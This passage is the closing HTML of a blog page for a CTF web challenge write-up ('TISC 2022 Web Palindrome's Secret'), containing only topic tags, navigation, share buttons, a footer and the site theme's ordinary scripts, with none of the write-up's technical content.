href=https://quentinkhoo.github.io/tags/web/>web</a></li><li><a href=https://quentinkhoo.github.io/tags/nodejs/>nodejs</a></li><li><a href=https://quentinkhoo.github.io/tags/express/>express</a></li><li><a href=https://quentinkhoo.github.io/tags/mysql/>mysql</a></li><li><a href=https://quentinkhoo.github.io/tags/traffic-server/>traffic-server</a></li><li><a href=https://quentinkhoo.github.io/tags/proxy/>proxy</a></li><li><a href=https://quentinkhoo.github.io/tags/sqli/>sqli</a></li><li><a href=https://quentinkhoo.github.io/tags/http-request-smuggling/>http-request-smuggling</a></li><li><a href=https://quentinkhoo.github.io/tags/dangling-markup-injection/>dangling-markup-injection</a></li><li><a href=https://quentinkhoo.github.io/tags/html-injection/>html-injection</a></li></ul><nav class=paginav><a class=next href=https://quentinkhoo.github.io/posts/tisc-2022-cloud-cloudynekos/><span class=title>Next »</span><br><span>TISC 2022 Cloud Cloudynekos</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Web Palindrome's Secret on twitter" href="https://twitter.com/intent/tweet/?text=TISC%202022%20Web%20Palindrome%27s%20Secret&url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-web-palindrome-secret%2f&hashtags=ctf%2ctisc-2022%2cweb%2cnodejs%2cexpress%2cmysql%2ctraffic-server%2cproxy%2csqli%2chttp-request-smuggling%2cdangling-markup-injection%2chtml-injection"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Web Palindrome's Secret on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-web-palindrome-secret%2f&title=TISC%202022%20Web%20Palindrome%27s%20Secret&summary=TISC%202022%20Web%20Palindrome%27s%20Secret&source=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-web-palindrome-secret%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Web Palindrome's Secret on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-web-palindrome-secret%2f&title=TISC%202022%20Web%20Palindrome%27s%20Secret"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Web Palindrome's Secret on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-web-palindrome-secret%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Web Palindrome's Secret on whatsapp" href="https://api.whatsapp.com/send?text=TISC%202022%20Web%20Palindrome%27s%20Secret%20-%20https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-web-palindrome-secret%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TISC 2022 Web Palindrome's Secret on telegram" href="https://telegram.me/share/url?text=TISC%202022%20Web%20Palindrome%27s%20Secret&url=https%3a%2f%2fquentinkhoo.github.io%2fposts%2ftisc-2022-web-palindrome-secret%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://quentinkhoo.github.io>Quentin</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>